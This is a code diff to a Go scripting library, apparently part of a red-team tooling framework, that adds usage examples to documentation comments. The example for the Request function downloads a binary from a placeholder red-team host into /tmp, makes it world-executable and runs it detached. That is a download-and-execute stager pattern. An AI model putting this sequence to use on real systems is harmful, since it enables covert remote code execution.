@@ -49,6 +49,12 @@ func familyAndTypeToString(connFamily, connType uint32) string {
 //  }
 //
 // @return (connections, nil) iff success; (nil, err) o/w
+//
+// @example
+//  load("sys", "connections")
+//
+//  for conn in connections():
+//      print("%s\t%s\t%s\t%s\t%s" % (conn["proto"], conn["localaddr"], conn["remoteaddr"], conn["status"], conn["pid"]))
 func Connections(parser script.ArgParser) (script.Retval, error) {
 	err := parser.RestrictKwargs("type", "ppid")
 	if err != nil {
@@ -84,14 +90,28 @@ func Connections(parser script.ArgParser) (script.Retval, error) {
 // Request uses the http package to send a HTTP request and return a response. Currently we only support GET and POST.
 //
 // @param requestURL:   A string that is the full requested URL.
+//
 // @param ?method:      The HTTP method of the request. The default is GET.
+//
 // @param ?writeToFile: The path to the file you wish to have the response written to. The default is to
 // just return the string.
+//
 // @param ?contentType: The value of the "Content-Type" header for your request. Required for POST, the default is
 // "application/json".
+//
 // @param ?data:        The body of your request. Only Available for POST.
 //
+//
 // @return (response, nil) iff success; (nil, err) o/w
+//
+// @example
+//  load("sys", "request")
+//
+//  new_bin = "/tmp/kqwncWECaaV"
+//  request("https://library.redteam.tld", writeToFile=new_bin)
+//	# set new_bin to 0755
+//  chmod(new_bin, ownerRead=True, ownerWrite=True, ownerExec=True, groupRead=True, groupExec=True, worldRead=True, worldExec=True)
+//  exec(new_bin, disown=True)
 func Request(parser script.ArgParser) (script.Retval, error) {
 	err := parser.RestrictKwargs("method", "writeToFile", "contentType", "data")
 	if err != nil {
